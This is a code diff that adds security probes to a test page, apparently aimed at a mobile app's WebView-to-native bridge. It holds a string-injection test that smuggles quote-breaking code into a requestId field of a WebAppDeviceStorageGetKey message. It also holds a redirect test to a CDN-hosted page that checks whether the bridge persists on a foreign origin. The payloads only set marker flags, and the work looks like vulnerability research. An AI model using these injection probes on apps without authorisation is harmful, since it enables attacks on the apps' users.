@@ -111,6 +111,28 @@ fetch(PROBE_URL).then(r=>r.blob()).then(b=>{
   box.appendChild(r);
 })();
 
+
+// round 3: K1 requestId-инъекция (native->JS) и K3 redirect (мост переживает смену origin)
+(function(){
+  const b=document.createElement('button'); b.textContent='K1 requestId inject';
+  b.onclick=()=>{
+    const evil1='x\"-window.__k1dq=1-\"';
+    const evil2="x\'-window.__k1sq=1-\'";
+    log('=> K1 raw GetKey with hostile requestId');
+    try{
+      window.webkit.messageHandlers.EventHandler.postMessage('WebAppDeviceStorageGetKey:'+JSON.stringify({requestId:evil1,key:'k'+RUN}));
+      window.webkit.messageHandlers.EventHandler.postMessage('WebAppDeviceStorageGetKey:'+JSON.stringify({requestId:evil2,key:'k'+RUN}));
+      window.webkit.messageHandlers.EventHandler.postMessage('WebAppDeviceStorageGetKey:'+JSON.stringify({requestId:'ok-'+RUN,key:'k'+RUN}));
+    }catch(e){log('K1 throw',e.message);}
+    setTimeout(()=>log('K1 result: __k1dq=',window.__k1dq,'__k1sq=',window.__k1sq),2500);
+  };
+  box.appendChild(b);
+
+  const r=document.createElement('button'); r.textContent='K3 redirect (bridge on foreign origin)';
+  r.onclick=()=>{ log('=> K3 redirect to CDN child'); setTimeout(function(){ location.href='https://cdn.jsdelivr.net/gh/nbafan00/dl-check@main/child.xhtml'; },300); };
+  box.appendChild(r);
+})();
+
 document.getElementById('meta').innerHTML="run: <b>"+RUN+"</b>";
 </script>
 </body>
